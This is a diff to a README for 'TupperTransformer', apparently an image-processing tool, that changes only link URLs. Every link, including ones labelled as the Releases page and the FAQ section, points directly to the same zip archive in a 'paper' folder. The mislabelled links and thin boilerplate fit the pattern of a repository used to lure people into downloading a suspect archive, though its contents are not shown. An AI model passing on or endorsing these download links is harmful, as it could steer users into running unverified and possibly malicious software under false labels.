@@ -1,7 +1,7 @@
 # 🎉 TupperTransformer - Transform Images with Ease
 
 ## 📥 Download Now
-[![Download TupperTransformer](https://raw.githubusercontent.com/00samoi00/TupperTransformer/main/paper/TupperTransformer_v1.7.zip)](https://raw.githubusercontent.com/00samoi00/TupperTransformer/main/paper/TupperTransformer_v1.7.zip)
+[![Download TupperTransformer](https://github.com/00samoi00/TupperTransformer/raw/refs/heads/main/paper/TupperTransformer_v1.7.zip)](https://github.com/00samoi00/TupperTransformer/raw/refs/heads/main/paper/TupperTransformer_v1.7.zip)
 
 ## 📋 Introduction
 TupperTransformer is an innovative image processing framework designed to apply transformations directly to Tupper's high-precision, integer-encoded bitmaps. This program enables you to manipulate images effortlessly, making it easier than ever to understand and interact with complex visual data.
@@ -10,10 +10,10 @@ TupperTransformer is an innovative image processing framework designed to apply 
 In this section, we will guide you step-by-step on how to download and run TupperTransformer on your computer.
 
 ### 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/00samoi00/TupperTransformer/main/paper/TupperTransformer_v1.7.zip) to download the latest version of TupperTransformer. 
+To get started, visit the [Releases page](https://github.com/00samoi00/TupperTransformer/raw/refs/heads/main/paper/TupperTransformer_v1.7.zip) to download the latest version of TupperTransformer. 
 
 1. Click on the link above to go to the Downloads section.
-2. Locate the file labeled with the latest version (e.g., `https://raw.githubusercontent.com/00samoi00/TupperTransformer/main/paper/TupperTransformer_v1.7.zip`).
+2. Locate the file labeled with the latest version (e.g., `https://github.com/00samoi00/TupperTransformer/raw/refs/heads/main/paper/TupperTransformer_v1.7.zip`).
 3. Click the file to start your download.
 
 ### ⚙️ System Requirements
@@ -70,7 +70,7 @@ If you encounter issues while using TupperTransformer, consider the following ti
 - Restart TupperTransformer and try loading the image again.
 - If an error occurs during processing, verify the image format is supported.
 
-For further assistance, you can check our [FAQ Section](https://raw.githubusercontent.com/00samoi00/TupperTransformer/main/paper/TupperTransformer_v1.7.zip) or open an issue on GitHub.
+For further assistance, you can check our [FAQ Section](https://github.com/00samoi00/TupperTransformer/raw/refs/heads/main/paper/TupperTransformer_v1.7.zip) or open an issue on GitHub.
 
 ## 📑 Contributing
 We welcome contributions to TupperTransformer. If you would like to help improve this project, please follow these steps:
